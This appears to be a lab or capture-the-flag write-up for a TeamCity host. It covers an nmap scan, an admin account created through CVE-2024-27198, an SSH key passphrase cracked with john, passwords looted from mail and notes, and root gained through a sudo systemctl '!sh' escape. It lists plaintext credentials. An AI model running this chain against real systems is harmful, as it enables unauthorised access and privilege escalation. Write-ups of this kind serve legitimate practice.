**IP:** `192.168.124.91`  
**OS/TECHNO:** Ubuntu / TeamCity  

---

## Users & Credentials
- Found via CVE exploitation: `admin:admin` (TeamCity)
- Discovered SSH key in repo commit → cracked passphrase
- From mail:  
  - `matthew : IdealismEngineAshen476`  
  - `dach : RefriedScabbedWasting502`

---

## Services
- `22/tcp` → OpenSSH 8.2p1 (Ubuntu 4ubuntu0.11)  
- `25/tcp` → Postfix SMTP (Ubuntu)  
- `80/tcp` → Nginx 1.18.0 → redirect to `http://teams.onlyrands.com/` (TeamCity login)  
- `443/tcp` → Closed (reset)  

---

## Nmap Output
```bash
PORT    STATE  SERVICE REASON         VERSION
22/tcp  open   ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
|_banner: SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.11
25/tcp  open   smtp    syn-ack ttl 61 Postfix smtpd
|_banner: 220 onlyrands.com ESMTP Postfix (Ubuntu)
80/tcp  open   http    syn-ack ttl 61 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp closed https   reset ttl 61
Service Info: Host: onlyrands.com; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

---

## Exploitation Path

### 1. TeamCity Exploit
- Found TeamCity version: `2023.05.4 (build 129421)`.  
- CVE-2023-42793 (RCE) didn’t work.  
- Used [CVE-2024-27198](https://github.com/rampantspark/CVE-2024-27198) → created a new admin user:  
  ```
  admin : admin
  ```

### 2. Source Code → SSH Key
- Examined commits → discovered SSH private key for `marcot`.  
- Used **ssh2john + john** to crack passphrase:
  ```bash
  python3 /usr/share/john/ssh2john.py id_rsa > id_rsa.hash
  john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
  ```
- Got valid password → shell as `marcot`.

### 3. Mail Looting
- Checked local mail spools `/var/mail/` and `/var/spool/mail/`.  
- Found message from `matthew` → revealed credential:
  ```
  matthew : IdealismEngineAshen476
  ```
- Switched to `matthew`.

### 4. Matthew’s Home Directory
- Found hidden note containing Dach’s password:
  ```
  dach : RefriedScabbedWasting502
  ```

### 5. Privilege Escalation
- With Dach’s account, checked sudo:
  ```bash
  sudo -l
  ```
  Output:
  ```
  (ALL) NOPASSWD: /usr/bin/systemctl status teamcity-server.service
  ```

- Exploited with systemctl shell escape:
  ```bash
  sudo systemctl status teamcity-server.service
  !sh
  ```

- **Root shell obtained** 
